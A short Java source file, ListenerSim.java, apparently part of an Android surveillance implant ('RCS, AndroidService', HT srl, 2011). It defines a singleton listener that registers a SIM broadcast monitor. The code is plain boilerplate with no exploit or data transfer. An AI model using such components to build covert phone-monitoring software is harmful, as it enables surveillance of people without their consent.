/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerSim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import com.android.service.Sim;

public class ListenerSim extends Listener<Sim> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerSim"; //$NON-NLS-1$

	private BroadcastMonitorSim simReceiver;

	/** The singleton. */
	private volatile static ListenerSim singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerSim self() {
		if (singleton == null) {
			synchronized (ListenerSim.class) {
				if (singleton == null) {
					singleton = new ListenerSim();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerSim();
	}

	@Override
	protected void stop() {
		simReceiver.unregister();
	}

	/**
	 * Register to Network Connection/Disconnection notification.
	 */
	private void registerSim() {
		simReceiver = new BroadcastMonitorSim();
		simReceiver.start();
		simReceiver.register();
	}
}
